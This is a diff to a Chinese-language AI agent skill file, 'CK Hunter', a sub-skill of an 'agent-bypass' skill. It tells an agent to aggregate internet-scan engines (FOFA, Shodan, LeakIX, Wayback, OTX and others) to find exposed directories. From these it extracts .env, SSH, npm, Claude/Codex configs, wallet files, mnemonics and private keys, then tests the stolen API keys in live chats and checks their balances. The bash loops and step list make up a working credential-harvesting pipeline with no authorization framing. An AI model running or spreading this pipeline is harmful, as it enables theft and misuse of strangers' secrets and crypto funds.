@@ -5,9 +5,34 @@ description: CK Hunter — FOFA + Shodan + Hunter + Quake + ZoomEye + Netlas + U
 
 # CK Hunter — 全源凭证猎取
 
+## QUICKSTART（必读！只读本区 + 当前执行段，禁止通读全文）
+
+**为什么**：本文件 2400+ 行 ≈ 40K token，全文读取会撑爆上下文、模型失焦、流程走样。正确姿势：读本区 + 按章节表定位只读当前 Step 段。
+
+**执行顺序**：`Step 0 密钥 → Step 1 聚合 21 源 → Step 1.9 域扩张 → Step 2 归一化去重 → Phase 0/0B 开放目录探针 → Phase 1-5D 凭证提取 → Phase 6 对话验证/余额 → Step 10 HTML 报告`
+
+**核心循环 6 步**：
+1. **密钥**：`config.yaml`（模板 `config.yaml.example`）或环境变量；必填 6：FOFA/SHODAN/HUNTER/QUAKE/ZOOMEYE/NETLAS；可选：URLSCAN/EXA/FIRECRAWL/CENSYS/GITHUB/BINARYEDGE/LEAKIX/PUBLICWWW/VT/THREATBOOK/GREYNOISE。**无 key 的源自动跳过（已内置守卫），缺 key 不阻塞流程**。
+2. **输入**：`hunt/targets.txt`（每行一个 URL/域名）；没给就先跑 Step 1/2，从 `unique_hosts.txt` 提取域名回填再重跑 Step 1.9。
+3. **聚合**：各源脚本按 Step 1 分页拉满 → `hunt/raw/*.jsonl`。
+4. **归一化**：`normalize_url` + `host_key`（去默认端口/大小写/末尾斜杠，IPv6 兼容）→ `hunt/unique_hosts.txt`。
+5. **探针+提取**：alive 探测 → 目录扫描（`dirs.txt`）→ 凭证提取（hermes/.env/.git/ssh/npmrc 等 80+ 模式）→ 直连探活。
+6. **验证+报告**：API key 对话验证/查余额 → `hunt/hunt_report.html`（kill-ai-slop 风格）。**`hunt/` 已 gitignore，禁止 `git add hunt/`。**
+
+**章节表（按需定位：`grep -n '章节关键词' ck-hunter.md` 得行号，read 该区间 30-100 行）**：
+| 需求 | 章节关键词 |
+|---|---|
+| 单源聚合脚本 | `FOFA 官方 API` / `Shodan 平台` / `Hunter 平台` / `Quake 平台` / `ZoomEye 平台` / `Netlas 平台` / `URLScan 平台` / `Exa 平台` / `Firecrawl 平台` / `Censys` / `BinaryEdge` / `LeakIX` / `crt.sh` / `Wayback` / `Gists` / `PublicWWW` / `VirusTotal` / `OTX` / `ThreatBook` / `GreyNoise` / `Hudson Rock` |
+| 目录探针 | `Phase 0` / `Phase 0B` |
+| 凭证提取 | `Phase 1` - `Phase 5D` |
+| 对话验证/余额 | `Phase 6` |
+| HTML 报告 | `Step 10` |
+
+**纪律**：无 key 源跳过不阻塞；每步只读当前段；输出落 `hunt/`；Key 不明文回显；命令缺工具时 grep 关键词读 30 行内片段，不整段重读。
+
 > **调用方式（主技能必读）**：本文件是 `agent-bypass` 技能的子技能正文，与主 SKILL.md 同目录。
 > 加载路径候选（按序）：`<技能目录>/ck-hunter.md` → `~/.agents/skills/agent-bypass/ck-hunter.md` → `~/.claude/skills/agent-bypass/ck-hunter.md` → `~/.config/opencode/skills/agent-bypass/ck-hunter.md` → `./skills/agent-bypass/ck-hunter.md` → `/var/minis/skills/agent-bypass/ck-hunter.md`。
-> 必须全文读取后再执行；读完输出 `CK-HUNTER LOADED @ <路径>` 确认。执行顺序：密钥管理 → Step 0 → 1 → 1.9 → 2 → 2.5/2.6 → Phase 0-6 → Step 10。
+> 加载协议见文首 QUICKSTART：只读 QUICKSTART + 按章节表切片，禁止通读全文。执行顺序：密钥管理 → Step 0 → 1 → 1.9 → 2 → 2.5/2.6 → Phase 0-6 → Step 10。
 
 ## 输入
 
@@ -30,19 +55,19 @@ Key:
 | Quake | `https://quake.360.net/api/v3/search/quake_service` | `title:"Directory listing for /" AND body:"{target}"` | Header `X-QuakeToken` | 360 Quake，POST JSON，分页用 `start`+`size`（size≤500），响应 `data` |
 | ZoomEye | `https://api.zoomeye.ai/host/search` | `title:"Directory listing for /" +"{target}"` | Header `API-KEY` | ZoomEye，page 20 条/页，需处理 `code`+`data.matches` |
 | Netlas | `https://app.netlas.io/api/responses/` | `http.title:"Directory listing for /" AND http.body:"{target}"` | Header `X-Api-Key` | Netlas，size 100 + start 偏移，响应 `items` |
-| GreyNoise | `https://api.greynoise.io/v3/community/{ip}` | —（IP 富化，非搜索） | 无/可选 `key` | 社区接口未认证约 100 次/天，认证后 50 次/周起；用于对已发现 IP 打标签（benign/malicious/unknown） |
+| GreyNoise | `https://api.greynoise.io/v3/community/{ip}` | —（IP 富化，非搜索） | 无/可选 `key` | 社区接口未认证可用约 100 次/天；注意 **404 = IP 不在库（正常响应）**，401 才是缺 key；认证后 50 次/周起；用于对已发现 IP 打标签（benign/malicious/unknown） |
 | URLScan | `https://urlscan.io/api/v1/search/` | `page.title:"Directory listing for /" && filename:"{target}"` | Header `API-Key` | URLScan，size 100 + `searchAfter`，响应 `results` |
 | Exa | `https://api.exa.ai/search` | 神经语义搜索（自然语言） | Header `x-api-key` / `Authorization: Bearer` | 语义搜索，适合挖 GitHub/Pastebin 公开泄露，非测绘；`contents.text` 返回 markdown |
 | Firecrawl | `https://api.firecrawl.dev/v1/search` | `Directory listing for "/"` | Header `Authorization: Bearer` | 搜索 + 抓取，`scrapeOptions.formats=["markdown"]` 返回全文 |
 | crt.sh | `https://crt.sh/?q=%.{domain}&output=json` | `%.{domain}`（证书透明度子域扩张） | 无需 Key | 免费；输出 list[{name_value,...}]；Step 1.9a，输入 `hunt/targets.txt` |
-| Wayback | `http://web.archive.org/cdx/search/cdx` | `url={domain}/*&filter=original:.*{target}` | 无需 Key | 免费；挖已删除但被存档的敏感文件；Step 1.9b |
+| Wayback | `https://web.archive.org/cdx/search/cdx` | `url={domain}/*&filter=original:.*{target}` | 无需 Key | 免费；挖已删除但被存档的敏感文件；Step 1.9b |
 | Gists | `https://api.github.com/gists/public` | 全量公开 gists 分页扫，按 21 目标文件名过滤 | Header `Authorization: Bearer ghp_xxx` | 与 GitHub 源共用 token，免费；近期最多 3000 条；Step 1.9c |
 | PublicWWW | `https://publicwww.com/websites/{query}` | `".{target}"`（网页源码正则） | 参数 `key`（format=json） | 源码搜索，挖 JS/HTML 里泄露的 key；freemium；Step 1.9d |
 | VirusTotal | `https://www.virustotal.com/api/v3/intelligence/search` | `url:".{target}"` | Header `x-api-key` | VT Intelligence 付费；URL/文件情报检索；Step 1.9e |
-| OTX | `https://otx.alienvault.com/api/v1/indicators/domain/{domain}/url_list/general` | 域名→URL 清单（含历史路径） | Header `X-Otx-Key`（可匿名限速） | 免费；Step 1.9f，输入 `hunt/targets.txt` |
+| OTX | `https://otx.alienvault.com/api/v1/indicators/domain/{domain}/url_list` | 域名→URL 清单（含历史路径） | Header `X-Otx-Key`（可匿名限速） | 免费；Step 1.9f，输入 `hunt/targets.txt` |
 | ThreatBook | `https://x.threatbook.com/v4/asset/query` | 域名/IP 资产测绘 | 参数 `apikey` | 微步在线，国内资产覆盖补充；Step 1.9g |
 
-> **Key 管理（统一）**：全部 Key 从 `config.yaml` 或环境变量读取，**禁止硬编码到文档/代码/仓库**。`config.yaml` 已加入 `.gitignore`，仅提交 `config.yaml.example` 模板。详见下方「密钥管理」。」
+> **Key 管理（统一）**：全部 Key 从 `config.yaml` 或环境变量读取，**禁止硬编码到文档/代码/仓库**。`config.yaml` 已加入 `.gitignore`，仅提交 `config.yaml.example` 模板。详见下方「密钥管理」。
 ---
 
 ## 输出（全部放入 `hunt/` 目录）
@@ -72,7 +97,7 @@ netlas: "YOUR_NETLAS_KEY"      # app.netlas.io  https://app.netlas.io/  Header X
 urlscan: "YOUR_URLSCAN_KEY"    # urlscan.io  https://urlscan.io/user/profile  Header API-Key
 exa: "YOUR_EXA_KEY"            # exa.ai  https://dashboard.exa.ai/api-keys  Header x-api-key
 firecrawl: "YOUR_FIRECRAWL_KEY" # firecrawl.dev  https://www.firecrawl.dev/app/api-keys  Header Authorization: Bearer
-greynoise: ""                  # 可选，无 Key 时 GreyNoise 限 10 次/天  https://viz.greynoise.io
+greynoise: ""                  # 可选，未认证约 100 次/天（404=IP 不在库属正常，401 才缺 key）  https://viz.greynoise.io
 ```
 
 **加载优先级：** `config.yaml` > 环境变量（`FOFA_KEY` / `SHODAN_KEY` / `HUNTER_KEY` / `QUAKE_KEY` / `ZOOMEYE_KEY` / `NETLAS_KEY` / `URLSCAN_KEY` / `EXA_API_KEY` / `FIRECRAWL_API_KEY` / `GREYNOISE_KEY` / `PUBLICWWW_KEY` / `VT_APIKEY` / `THREATBOOK_KEY` / `OTX_KEY`）> `HUNTER_CONFIG` 指定路径。脚本内同时支持 `python3 -c "yaml.safe_load"` 与 `grep` 兜底，无 PyYAML 也能跑。
@@ -879,11 +904,13 @@ fi
 ```bash
 # LeakIX 平台（红队 P0，专注泄露，开放目录/敏感文件专用爬虫）
 # API: GET https://leakix.net/search?scope=leak&q=plugin:DirectoryListingPlugin  Header: api-key
-# 文档: https://leakix.net/api  免费 1000/天，无 key 也可匿名
+# 文档: https://leakix.net/api  免费 1000/天，需免费注册 key（匿名已关，2026-09 实测 401）
 LEAKIX_KEY=$(python3 -c "import yaml,os;print((yaml.safe_load(open(os.environ.get('HUNTER_CONFIG','./config.yaml'))) or {}).get('leakix','') or os.environ.get('LEAKIX_API_KEY',''))" 2>/dev/null | tr -d ' \r\n')
 [ -z "$LEAKIX_KEY" ] && LEAKIX_KEY=$(grep -m1 -E '^\s*leakix:\s*' "${HUNTER_CONFIG:-./config.yaml}" 2>/dev/null | sed -E 's/.*leakix:\s*"?([^"]*)"?.*/\1/' | tr -d ' \r\n')
-# LeakIX 支持匿名，无 key 也跑
-for TOOL in hermes claude codex openclaw opencode npmrc ssh env git telegram session walletjson walletdat secretjson dotsecret binance ethereum privatekey mnemonic apikeys bybit dsstore; do
+# LeakIX 需 key（匿名 401 实测），无 key 直接跳过
+LEAKIX_SKIP=0
+if [ -z "$LEAKIX_KEY" ]; then echo "  [skip] LeakIX 无 key（匿名已关闭，实测 401）"; LEAKIX_SKIP=1; fi
+if [ "$LEAKIX_SKIP" -eq 0 ]; then for TOOL in hermes claude codex openclaw opencode npmrc ssh env git telegram session walletjson walletdat secretjson dotsecret binance ethereum privatekey mnemonic apikeys bybit dsstore; do
   case $TOOL in
     hermes)    BODY=".hermes" ;;
     claude)    BODY=".claude" ;;
@@ -915,6 +942,7 @@ for TOOL in hermes claude codex openclaw opencode npmrc ssh env git telegram ses
   echo "[LEAKIX] $TOOL: ${N:-0} 条"
   sleep 1
 done
+fi
 ```
 
 ### Step 1.9: 增补 7 源（crt.sh / Wayback / Gists / PublicWWW / VirusTotal / OTX / ThreatBook）
@@ -969,7 +997,7 @@ while read -r DOMAIN; do
   DSUF=$(echo "$DOMAIN" | tr '.' '_')
   for TOOL in hermes claude codex openclaw opencode npmrc ssh env git telegram session walletjson walletdat secretjson dotsecret binance ethereum privatekey mnemonic apikeys bybit dsstore; do
     BODY=$(tool_body "$TOOL")
-    curl -s --max-time 60 -G "http://web.archive.org/cdx/search/cdx" \
+    curl -s --max-time 60 -G "https://web.archive.org/cdx/search/cdx" \
       --data-urlencode "url=${DOMAIN}/*" \
       --data-urlencode "output=json" \
       --data-urlencode "collapse=urlkey" \
@@ -1062,7 +1090,7 @@ while read -r DOMAIN; do
   [ -z "$DOMAIN" ] && continue
   FN="hunt/csv/root_$(echo "$DOMAIN" | tr '.' '_')_otx.json"
   curl -s --max-time 40 ${OTX_KEY:+-H "X-Otx-Key: ${OTX_KEY}"} \
-    "https://otx.alienvault.com/api/v1/indicators/domain/${DOMAIN}/url_list/general?limit=200" > "$FN" 2>/dev/null
+    "https://otx.alienvault.com/api/v1/indicators/domain/${DOMAIN}/url_list?limit=200" > "$FN" 2>/dev/null
   N=$(python3 -c "import json;print(len(json.load(open('$FN',encoding='utf-8',errors='ignore')).get('url_list',[])))" 2>/dev/null)
   echo "[OTX] ${DOMAIN}: ${N:-0} URL"
   sleep 2
@@ -1373,7 +1401,7 @@ echo "原始: $(wc -l < /tmp/all_urls.txt)  URL去重: $(wc -l < /tmp/unique_url
 
 ---
 
-### Step 2.5: GreyNoise IP 富化（可选，社区接口约 100 次/天）
+### Step 2.5: GreyNoise IP 富化（可选，未认证约 100 次/天；404=IP 不在库属正常，401 才缺 key）
 
 ```bash
 > /tmp/greynoise_enrich.json
